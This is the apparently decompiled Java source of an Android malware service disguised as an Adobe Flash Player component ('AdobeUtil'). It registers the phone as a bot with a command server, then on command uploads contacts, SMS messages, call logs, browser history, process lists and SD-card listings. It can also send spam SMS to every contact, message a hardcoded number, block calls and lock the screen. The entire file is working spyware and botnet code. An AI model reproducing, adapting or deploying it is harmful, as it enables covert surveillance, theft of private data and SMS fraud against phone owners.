package com.adobe.flashplayer_;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.CountDownTimer;
import android.os.Debug.MemoryInfo;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.Browser;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.ExecutionException;

public class AdobeUtil extends Service {
    PowerManager pm;
    WakeLock wl;

    public void onCreate() {
        super.onCreate();
        Context context = getApplicationContext();
        this.pm = (PowerManager) getSystemService("power");
        this.wl = this.pm.newWakeLock(1, "AdobeServices");
        this.wl.acquire();
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
        NetworkInfo netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        String BotID = readConfig("BotID");
        String BotNetwork = readConfig("BotNetwork");
        String BotLocation = readConfig("BotLocation");
        String Reich_ServerGate = readConfig("Reich_ServerGate");
        String BotVer = readConfig("BotVer");
        String SDK = VERSION.RELEASE;
        if (netInfo != null && netInfo.isConnectedOrConnecting()) {
            String act;
            String[] cmd;
            String[] cmd_data;
            String data;
            String temp_Z;
            Cursor phones;
            FlashVirtual flashVirtual;
            String[] strArr;
            String[] path;
            String[] fl;
            String answ = "";
            try {
                String pn = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
                pn = pn == null ? "NA" : pn.replace("+", "");
                answ = (String) new FlashVars().execute(new String[]{new StringBuilder(String.valueOf(Reich_ServerGate)).append("?a=1&b=").append(BotID).append("&c=").append(BotNetwork.replace(":", "")).append("&d=").append(BotLocation).append("&e=").append(pn).append("&f=").append(BotVer).append("&g=").append(SDK).toString()}).get();
                if (answ == null) {
                    answ = "";
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e2) {
                e2.printStackTrace();
            }
            if (answ.indexOf("setFilter") != -1) {
                String[] test = answ.split(" ");
                act = test[2];
                if (act.indexOf("start") != -1) {
                    writeConfig("w", test[1], context);
                }
                if (act.indexOf("stop") != -1) {
                    writeConfig("w", "NOFILTER", context);
                }
                sendREP(Reich_ServerGate, BotID, "setFilter[" + test[1] + "]" + act + ":Executed:HTTP", context);
            }
            if (answ.indexOf("execMod") != -1) {
                cmd = answ.split(" ");
                execMod(cmd[1], context);
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    sendREP(Reich_ServerGate, BotID, "execMod[" + cmd[1] + "]:Executed:HTTP", context);
                }
            }
            if (answ.indexOf("macros") != -1) {
                cmd = answ.split(" ");
                if (cmd[1].indexOf("a") != -1) {
                    sendSMS("+" + readConfig("Reich_SMSGate", context), BotID);
                    execMod("A", context);
                }
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    sendREP(Reich_ServerGate, BotID, "macros[" + cmd[1] + "]:Executed:HTTP", context);
                }
            }
            if (answ.indexOf("forceZ") != -1) {
                if (answ.split(" ")[1].equals("On")) {
                    writeConfig("forceZ", "On", context);
                } else {
                    writeConfig("forceZ", "Off", context);
                }
            }
            if (answ.indexOf("callBlock") != -1) {
                cmd_data = answ.split(" ");
                data = cmd_data[1];
                act = cmd_data[2];
                if (act.indexOf("start") != -1) {
                    writeConfig("c", data, context);
                }
                if (act.indexOf("stop") != -1) {
                    writeConfig("c", "1234567890", context);
                }
                sendREP(Reich_ServerGate, BotID, "callBlock[" + data + "]" + act + ":Executed:HTTP", context);
            }
            if (answ.indexOf("getContacts") != -1) {
                temp_Z = "";
                data = "";
                phones = context.getContentResolver().query(Phone.CONTENT_URI, null, null, null, null);
                while (phones.moveToNext()) {
                    temp_Z = new StringBuilder(String.valueOf(temp_Z)).append(phones.getString(phones.getColumnIndex("display_name"))).append(" ").append(phones.getString(phones.getColumnIndex("data1"))).append("\r").toString();
                }
                phones.close();
                data = new StringBuilder(String.valueOf(data)).append(temp_Z).toString();
                sendREP(Reich_ServerGate, BotID, "getContacts:Executed:HTTP", context);
                saveData(data, "contacts.txt", context);
                flashVirtual = new FlashVirtual();
                strArr = new String[3];
                strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=contacts&i=cmd";
                strArr[1] = context.getFileStreamPath("contacts.txt").toString();
                strArr[2] = Reich_ServerGate;
                flashVirtual.execute(strArr);
            }
            if (answ.indexOf("loadSpam") != -1) {
                cmd_data = answ.split(" ");
                temp_Z = "";
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    try {
                        writeConfig("spam_data", (String) new FlashVars().execute(new String[]{cmd_data[1]}).get(), context);
                    } catch (InterruptedException | ExecutionException e3) {
                    }
                    sendREP(Reich_ServerGate, BotID, "loadSpam[OK]:Executed:HTTP", context);
                }
            }
            if (answ.indexOf("sentSpam") != -1) {
                data = "";
                temp_Z = "";
                phones = context.getContentResolver().query(Phone.CONTENT_URI, null, null, null, null);
                while (phones.moveToNext()) {
                    String acc = phones.getString(phones.getColumnIndex("display_name"));
                    String tel = phones.getString(phones.getColumnIndex("data1"));
                    temp_Z = new StringBuilder(String.valueOf(temp_Z)).append(acc).append(" ").append(tel).append("\r").toString();
                    sendSMS(tel, readConfig("spam_data", context));
                }
                phones.close();
                data = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(data)).append(" [ Sent Messages ] \r").toString())).append(temp_Z).toString())).append(" [ End ] ").toString();
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    sendREP(Reich_ServerGate, BotID, "sentSpam[OK]:Executed:HTTP", context);
                    saveData(data, "spamlist.txt", context);
                    flashVirtual = new FlashVirtual();
                    strArr = new String[3];
                    strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=spamlist&i=cmd";
                    strArr[1] = context.getFileStreamPath("spamlist.txt").toString();
                    strArr[2] = Reich_ServerGate;
                    flashVirtual.execute(strArr);
                }
            }
            if (answ.indexOf("getMessages") != -1) {
                String pack_inbox = "";
                String pack_inbox_pack = "";
                String pack_outbox = "";
                String pack_outbox_pack = "";
                Cursor inc = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                while (inc.moveToNext()) {
                    pack_inbox = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(pack_inbox)).append(inc.getString(inc.getColumnIndex("address"))).append("\r").toString())).append(millisToDate(inc.getLong(inc.getColumnIndex("date")))).append("\r").toString())).append(inc.getString(inc.getColumnIndex("body"))).append("\r\r").toString();
                }
                inc.close();
                pack_inbox_pack = new StringBuilder(String.valueOf(pack_inbox_pack)).append(pack_inbox).toString();
                Cursor ouc = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
                while (ouc.moveToNext()) {
                    pack_outbox = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(pack_outbox)).append(ouc.getString(ouc.getColumnIndex("address"))).append("\r").toString())).append(millisToDate(ouc.getLong(ouc.getColumnIndex("date")))).append("\r").toString())).append(ouc.getString(ouc.getColumnIndex("body"))).append("\r\r").toString();
                }
                ouc.close();
                pack_outbox_pack = new StringBuilder(String.valueOf(pack_outbox_pack)).append(pack_outbox).toString();
                sendREP(Reich_ServerGate, BotID, "getMessages:Executed:HTTP", context);
                saveData(pack_inbox_pack, "in", context);
                saveData(pack_outbox_pack, "out", context);
                if (readConfig("in", context).length() > 0) {
                    flashVirtual = new FlashVirtual();
                    strArr = new String[3];
                    strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=in_sms&i=cmd";
                    strArr[1] = context.getFileStreamPath("in").toString();
                    strArr[2] = Reich_ServerGate;
                    flashVirtual.execute(strArr);
                }
                if (readConfig("out", context).length() > 0) {
                    flashVirtual = new FlashVirtual();
                    strArr = new String[3];
                    strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=out_sms&i=cmd";
                    strArr[1] = context.getFileStreamPath("out").toString();
                    strArr[2] = Reich_ServerGate;
                    flashVirtual.execute(strArr);
                }
            }
            if (answ.indexOf("keyHttpGate") != -1) {
                data = answ.split(" ")[1];
                sendREP(Reich_ServerGate, BotID, "keyHttpGate[" + data.replace("http://", "") + "]:Executed:HTTP", context);
                writeConfig("Reich_ServerGate", data, context);
            }
            if (answ.indexOf("keySmsGate") != -1) {
                data = answ.split(" ")[1];
                writeConfig("Reich_SMSGate", data, context);
                sendREP(Reich_ServerGate, BotID, "keySmsGate[" + data + "]:Executed:HTTP", context);
            }
            if (answ.indexOf("getCalls") != -1) {
                StringBuffer sb = new StringBuffer();
                Cursor managedCursor = context.getContentResolver().query(Calls.CONTENT_URI, null, null, null, null);
                int number = managedCursor.getColumnIndex("number");
                int type = managedCursor.getColumnIndex("type");
                int date = managedCursor.getColumnIndex("date");
                int duration = managedCursor.getColumnIndex("duration");
                while (managedCursor.moveToNext()) {
                    String phNumber = managedCursor.getString(number);
                    String callType = managedCursor.getString(type);
                    Date date2 = new Date(Long.valueOf(managedCursor.getString(date)).longValue());
                    String callDuration = managedCursor.getString(duration);
                    String dir = null;
                    switch (Integer.parseInt(callType)) {
                        case 1:
                            dir = "Incoming";
                            break;
                        case 2:
                            dir = "Outgoing";
                            break;
                        case 3:
                            dir = "Rejected";
                            break;
                        default:
                            break;
                    }
                    sb.append(dir + "\r");
                    sb.append("Phone: " + phNumber + "\rDate: " + date2 + "\rTalkTime: " + callDuration + " sec\r");
                    sb.append("\r");
                }
                managedCursor.close();
                sendREP(Reich_ServerGate, BotID, "getCalls:Executed:HTTP", context);
                saveData(sb.toString(), "calls.txt", context);
                flashVirtual = new FlashVirtual();
                strArr = new String[3];
                strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=calls&i=cmd";
                strArr[1] = context.getFileStreamPath("calls.txt").toString();
                strArr[2] = Reich_ServerGate;
                flashVirtual.execute(strArr);
            }
            if (answ.indexOf("getProcesses") != -1) {
                StringBuffer pcs = new StringBuffer();
                ActivityManager activityManager = (ActivityManager) context.getSystemService("activity");
                List<RunningAppProcessInfo> runningAppProcesses = activityManager.getRunningAppProcesses();
                Map<Integer, String> pidMap = new TreeMap();
                for (RunningAppProcessInfo runningAppProcessInfo : runningAppProcesses) {
                    pidMap.put(Integer.valueOf(runningAppProcessInfo.pid), runningAppProcessInfo.processName);
                }
                Iterator it = pidMap.keySet().iterator();
                while (it.hasNext()) {
                    int[] pids = new int[]{((Integer) it.next()).intValue()};
                    for (MemoryInfo pidMemoryInfo : activityManager.getProcessMemoryInfo(pids)) {
                        Object[] objArr = new Object[2];
                        objArr[0] = Integer.valueOf(pids[0]);
                        objArr[1] = pidMap.get(Integer.valueOf(pids[0]));
                        pcs.append(String.format("pid [%d] process [%s]\r", objArr));
                    }
                }
                String pcsZ = pcs.toString();
                String URL = readConfig("Reich_ServerGate", context);
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    saveData(pcsZ, "pcss.txt", context);
                    flashVirtual = new FlashVirtual();
                    strArr = new String[3];
                    strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=processes&i=cmd";
                    strArr[1] = context.getFileStreamPath("pcss.txt").toString();
                    strArr[2] = URL;
                    flashVirtual.execute(strArr);
                    sendREP(Reich_ServerGate, BotID, "getProcesses:Executed:HTTP", context);
                }
            }
            if (answ.indexOf("remoteSD") != -1) {
                String root = answ.split(" ")[1];
                String temp = "";
                if (root.indexOf("root") != -1) {
                    root = "";
                }
                if (Environment.getExternalStorageState().equals("mounted")) {
                    File file = new File(Environment.getExternalStorageDirectory(), root);
                    String zroot = "";
                    temp = new StringBuilder(String.valueOf(temp)).append("rfs=").append(root == "" ? "/" : "sdcard/" + root).append("\r").toString();
                    if (file != null) {
                        for (File tmpf : file.listFiles()) {
                            if (tmpf.canRead()) {
                                String size_f;
                                String type_f = tmpf.isFile() ? "File" : "DIR";
                                if (type_f.indexOf("File") != -1) {
                                    size_f = tmpf.length() + " bytes";
                                } else {
                                    size_f = "Directory";
                                }
                                temp = new StringBuilder(String.valueOf(temp)).append(tmpf.getPath().toString()).append(";").append(type_f).append(";").append(size_f).append(";").append(millisToDate(tmpf.lastModified())).append("\r").toString();
                            }
                        }
                    }
                }
                saveData(temp, "backconnect_data.txt", context);
                flashVirtual = new FlashVirtual();
                strArr = new String[3];
                strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=backconnect_data&i=cmd";
                strArr[1] = context.getFileStreamPath("BCTMP_" + BotID + ".txt").toString();
                strArr[2] = Reich_ServerGate;
                flashVirtual.execute(strArr);
                AnonymousClass1 anonymousClass1 = new CountDownTimer(15000, 3000) {
                    public void onTick(long millisUntilFinished) {
                    }

                    public void onFinish() {
                    }
                };
            }
            if (answ.indexOf("Download") != -1) {
                path = answ.split(" ");
                flashVirtual = new FlashVirtual();
                strArr = new String[3];
                strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=file&i=cmd";
                strArr[1] = path[1].toString();
                strArr[2] = Reich_ServerGate;
                flashVirtual.execute(strArr);
            }
            if (answ.indexOf("sendSMS") != -1) {
                path = answ.split(" ");
                String text = path[2].replace("_", " ");
                String who = path[1];
                if (who.length() > 9) {
                    who = "+" + who;
                }
                if (SmsManager.getDefault() != null) {
                    sendSMS(who, text);
                }
                sendREP(Reich_ServerGate, BotID, "sendSMS[" + path[1] + "_" + text.replace(" ", "_") + "]:Executed:HTTP", context);
            }
            if (answ.indexOf("browserHistory") != -1) {
                StringBuffer stock = new StringBuffer();
                Cursor mCur = context.getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, null, null, null);
                mCur.moveToFirst();
                if (mCur.moveToFirst() && mCur.getCount() > 0) {
                    while (!mCur.isAfterLast()) {
                        stock.append("Title: " + mCur.getString(5) + "\r");
                        stock.append("URL: " + mCur.getString(1) + "\r");
                        stock.append("Visits: " + mCur.getString(2) + "\r");
                        mCur.moveToNext();
                    }
                }
                saveData(stock.toString(), "browser_history.txt", context);
                flashVirtual = new FlashVirtual();
                strArr = new String[3];
                strArr[0] = "&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone") + "&f=" + BotVer + "&g=" + SDK + "&h=browser_history&i=cmd";
                strArr[1] = context.getFileStreamPath("browser_history.txt").toString();
                strArr[2] = Reich_ServerGate;
                flashVirtual.execute(strArr);
                sendREP(Reich_ServerGate, BotID, "browserHistory:Executed", context);
            }
            if (answ.indexOf("faceLock") != -1) {
                fl = answ.split(" ");
                String face = "nodata";
                try {
                    face = (String) new FlashVars().execute(new String[]{fl[1]}).get();
                } catch (InterruptedException e4) {
                    e4.printStackTrace();
                } catch (ExecutionException e22) {
                    e22.printStackTrace();
                }
                writeConfig("warn", face, context);
                sendREP(Reich_ServerGate, BotID, "faceLock[OK]:Executed", context);
            }
            if (answ.indexOf("forceLock") != -1) {
                Prefs prefs;
                fl = answ.split(" ");
                if (fl[1].contains("On")) {
                    sendREP(Reich_ServerGate, BotID, "forceLock[" + fl[1] + "]:Executed", context);
                    writeConfig("forcelock", "LOCKED", getApplicationContext());
                    prefs = new Prefs(getApplicationContext(), "ON");
                }
                if (fl[1].contains("Off")) {
                    sendREP(Reich_ServerGate, BotID, "forceLock[" + fl[1] + "]:Executed", context);
                    writeConfig("forcelock", "NONLOCK", context);
                    prefs = new Prefs(getApplicationContext(), "OFF");
                }
            }
        }
        stopSelf();
    }

    public void sendSMS(String n, String msg) {
        String phoneNumber = n;
        String message = msg;
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(phoneNumber, null, smsManager.divideMessage(message), null, null);
    }

    public static String millisToDate(long currentTime) {
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(currentTime);
        return calendar.getTime().toString();
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    private void sendREP(String Reich_ServerGate, String i, String rep, Context c) {
        String BotID = readConfig("BotID");
        String BotNetwork = readConfig("BotNetwork");
        String BotLocation = readConfig("BotLocation");
        String SDK = VERSION.RELEASE;
        String BotVer = readConfig("BotVer");
        String pn = ((TelephonyManager) c.getSystemService("phone")).getLine1Number();
        pn = pn == null ? "" : pn.replace("+", "");
        if (BotID == null) {
            BotID = Secure.getString(c.getContentResolver(), "android_id");
        }
        String request = "a=2&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + pn + "&f=" + BotVer + "&g=" + SDK + "&h=" + rep;
        new FlashVars().execute(new String[]{new StringBuilder(String.valueOf(Reich_ServerGate)).append("?").append(request).toString()});
    }

    private void execMod(String m, Context c) {
        if (m.contains("A")) {
            writeConfig("w", "*", c);
            sendSMS("79262000900", "HELP");
            writeConfig("MacrosAState", "A", c);
        }
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    private String readConfig(String config) {
        String ret = "";
        try {
            InputStream inputStream = openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    public void onDestroy() {
    }
}
